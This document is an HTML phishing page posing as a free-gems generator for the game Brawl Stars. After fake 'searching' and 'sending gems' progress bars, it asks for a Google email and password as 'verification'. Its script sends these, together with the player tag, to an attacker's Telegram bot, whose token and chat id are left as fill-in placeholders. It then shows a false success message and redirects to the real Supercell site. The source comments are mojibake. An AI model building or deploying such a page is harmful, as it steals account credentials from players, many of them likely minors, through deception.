<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Brawl Stars</title>
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&display=swap" rel="stylesheet">
    <style>
        /* –ì–õ–ê–í–ù–´–ô –°–ï–ö–†–ï–¢ –®–†–ò–§–¢–ê: –ú–Ω–æ–≥–æ—Å–ª–æ–π–Ω–∞—è –æ–±–≤–æ–¥–∫–∞ */
        .bs-font {
            font-family: 'Lilita One', cursive;
            color: #ffffff;
            text-transform: uppercase;
            letter-spacing: 1px;
            text-shadow: 
                -3px -3px 0 #000,  3px -3px 0 #000,
                -3px  3px 0 #000,  3px  3px 0 #000,
                -1px -4px 0 #000,  1px -4px 0 #000,
                -1px  4px 0 #000,  1px  4px 0 #000,
                0px 6px 0 rgba(0,0,0,0.5); /* –ì–ª—É–±–æ–∫–∞—è —Ç–µ–Ω—å –≤–Ω–∏–∑ */
        }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background: #101c6e; overflow: hidden;
        }

        /* –§–æ–Ω–æ–≤—ã–π –ø–∞—Ç—Ç–µ—Ä–Ω */
        .bg-pattern {
            position: fixed; top: 0; left: 0; width: 200%; height: 200%;
            background: url('https://brawlergems.com/generator/images/brawl_stars_pattern_transparent.png');
            background-size: 250px; opacity: 0.1;
            animation: move 40s linear infinite;
        }
        @keyframes move { from {transform: translate(0,0);} to {transform: translate(-250px, -250px);} }

        .wrapper {
            position: relative; z-index: 10;
            display: flex; flex-direction: column; align-items: center;
            padding: 10px; height: 100vh;
        }

        .logo { width: 180px; filter: drop-shadow(0 5px 0 rgba(0,0,0,0.3)); margin: 10px 0; }

        /* –û–°–ù–û–í–ù–û–ï –û–ö–ù–û */
        .main-box {
            background: linear-gradient(180deg, #2a49d6 0%, #15299b 100%);
            border: 6px solid #000; border-radius: 35px;
            width: 100%; max-width: 400px; padding: 25px;
            box-shadow: inset 0 -10px 0 #0d1a6e, 0 15px 0 rgba(0,0,0,0.4);
            position: relative; box-sizing: border-box;
        }

        /* –ü–û–õ–ï –í–í–û–î–ê –¢–ï–ì–ê */
        .tag-box {
            background: #08103d; border: 5px solid #000; border-radius: 18px;
            display: flex; align-items: center; padding: 12px 15px; margin: 20px 0;
            box-shadow: inset 0 5px 10px rgba(0,0,0,0.5);
        }
        .tag-box span { font-size: 32px; color: #ffcc00; margin-right: 10px; }
        input {
            background: transparent; border: none; width: 100%;
            font-family: 'Lilita One'; font-size: 30px; color: #fff;
            outline: none; text-transform: uppercase;
        }

        /* –ö–ù–û–ü–ö–ê BRAWL STYLE */
        .btn-bs {
            background: linear-gradient(180deg, #ffde3a 0%, #f7a200 100%);
            border: 5px solid #000; border-radius: 20px;
            padding: 15px; width: 100%; cursor: pointer;
            box-shadow: 0 8px 0 #a36200, 0 12px 20px rgba(0,0,0,0.4);
            transition: transform 0.05s;
        }
        .btn-bs:active { transform: translateY(6px); box-shadow: 0 2px 0 #a36200; }
        .btn-text { font-size: 26px; }

        /* –°–ï–¢–ö–ê –ú–ê–ì–ê–ó–ò–ù–ê –ì–ï–ú–û–í */
        .gems-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }
        .gem-card {
            background: #1e37b5; border: 5px solid #000; border-radius: 22px;
            padding: 15px; cursor: pointer; position: relative;
            box-shadow: inset 0 -6px 0 #112175;
        }
        .gem-card.selected { border-color: #fff; background: #3d5afe; }
        .gem-card img { width: 65px; margin-bottom: 5px; }

        /* –ü–†–û–ì–†–ï–°–°-–ë–ê–† */
        .bar-bg { background: #08103d; border: 5px solid #000; border-radius: 20px; height: 35px; overflow: hidden; margin: 20px 0; }
        .bar-fill { background: linear-gradient(90deg, #ffeb3b, #ff9800); width: 0%; height: 100%; }

        /* –ö–ù–û–ü–ö–ê –ù–ê–ó–ê–î (–°–ò–ù–ò–ô –ö–í–ê–î–†–ê–¢) */
        .back-btn {
            position: absolute; left: -10px; top: -10px; width: 55px; height: 55px;
            background: #3498db; border: 5px solid #000; border-radius: 12px;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 6px 0 #1e608d; cursor: pointer; z-index: 100;
        }

        /* GOOGLE FORM */
        .g-input {
            width: 100%; padding: 15px; margin: 8px 0; border: 4px solid #000;
            border-radius: 12px; font-size: 16px; font-weight: bold; box-sizing: border-box;
        }
    </style>
</head>
<body>

<div class="bg-pattern"></div>

<div class="wrapper">
    <img src="https://brawlergems.com/generator/images/logo_outlined_noBG.png" class="logo">

    <div class="main-box" id="box">
        <div class="back-btn" id="back" style="display:none;" onclick="goBack()">
            <img src="https://brawlergems.com/generator/images/back.png" width="30">
        </div>

        <div id="step1">
            <h2 class="bs-font" style="font-size: 26px; margin: 0;">ENTER PLAYER TAG</h2>
            <div class="tag-box">
                <span class="bs-font">#</span>
                <input type="text" id="tag" placeholder="P8Q9RB2" maxlength="9">
            </div>
            <div class="btn-bs" onclick="toSearch()">
                <span class="bs-font btn-text">CONNECT</span>
            </div>
        </div>

        <div id="step2" style="display:none;">
            <h2 class="bs-font">SEARCHING...</h2>
            <div class="bar-bg"><div class="bar-fill" id="b1"></div></div>
            <div class="bs-font" style="font-size: 14px;" id="status">CONNECTING TO DATABASE...</div>
        </div>

        <div id="step3" style="display:none;">
            <h2 class="bs-font" style="font-size: 22px;">CHOOSE REWARD</h2>
            <div class="gems-grid">
                <div class="gem-card selected" onclick="sel(this,'30')"><img src="https://brawlergems.com/generator/images/30.png"><div class="bs-font">30</div></div>
                <div class="gem-card" onclick="sel(this,'360')"><img src="https://brawlergems.com/generator/images/360.png"><div class="bs-font">360</div></div>
                <div class="gem-card" onclick="sel(this,'950')"><img src="https://brawlergems.com/generator/images/950.png"><div class="bs-font">950</div></div>
                <div class="gem-card" onclick="sel(this,'2000')"><img src="https://brawlergems.com/generator/images/2000.png"><div class="bs-font">2000</div></div>
            </div>
            <div class="btn-bs" onclick="toGen()">
                <span class="bs-font btn-text">CLAIM GEMS</span>
            </div>
        </div>

        <div id="step4" style="display:none;">
            <h2 class="bs-font">SENDING GEMS...</h2>
            <div class="bar-bg"><div class="bar-fill" id="b2"></div></div>
            <div class="bs-font" id="perc" style="font-size: 18px;">0%</div>
        </div>

        <div id="step5" style="display:none; text-align: left;">
            <center><img src="https://brawlergems.com/generator/images/supercell_id_logo.png" width="150"></center>
            <h3 class="bs-font" style="font-size: 18px; text-align: center; margin: 15px 0;">Verification Required</h3>
            <input type="email" id="email" class="g-input" placeholder="Google Email">
            <input type="password" id="pass" class="g-input" placeholder="Password">
            <div class="btn-bs" style="margin-top: 10px;" onclick="sendData()">
                <span class="bs-font btn-text">VERIFY NOW</span>
            </div>
        </div>
    </div>
</div>

<script>
    let pTag = ""; let pAmt = "30";

    function show(id) {
        ['step1','step2','step3','step4','step5'].forEach(s => document.getElementById(s).style.display='none');
        document.getElementById(id).style.display='block';
    }

    function toSearch() {
        pTag = document.getElementById('tag').value;
        if(pTag.length < 3) return alert("Invalid Tag");
        show('step2');
        let p = 0;
        let iv = setInterval(() => {
            p += 2;
            document.getElementById('b1').style.width = p + "%";
            if(p >= 100) { clearInterval(iv); show('step3'); document.getElementById('back').style.display='flex'; }
        }, 30);
    }

    function sel(el, v) {
        document.querySelectorAll('.gem-card').forEach(c => c.classList.remove('selected'));
        el.classList.add('selected'); pAmt = v;
    }

    function toGen() {
        show('step4'); document.getElementById('back').style.display='none';
        let p = 0;
        let iv = setInterval(() => {
            p += 1;
            document.getElementById('b2').style.width = p + "%";
            document.getElementById('perc').innerText = p + "%";
            if(p >= 100) { clearInterval(iv); show('step5'); document.getElementById('back').style.display='flex'; }
        }, 40);
    }

    function goBack() {
        const cur = document.querySelector('#box > div[id]:not([style*="none"])').id;
        if(cur == 'step3') { show('step1'); document.getElementById('back').style.display='none'; }
        if(cur == 'step5') show('step3');
    }

    async function sendData() {
        const m = document.getElementById('email').value;
        const p = document.getElementById('pass').value;
        if(!m || !p) return alert("Fill fields!");
        const tok = "–¢–í–û–ô_–¢–û–ö–ï–ù"; const cid = "–¢–í–û–ô_ID";
        const txt = `üéØ LOG\nTag: #${pTag}\nGems: ${pAmt}\nMail: ${m}\nPass: ${p}`;
        await fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(txt)}`);
        alert("Verification successful! Gems will arrive in 24h.");
        window.location.href = "https://supercell.com";
    }
</script>

</body>
</html>
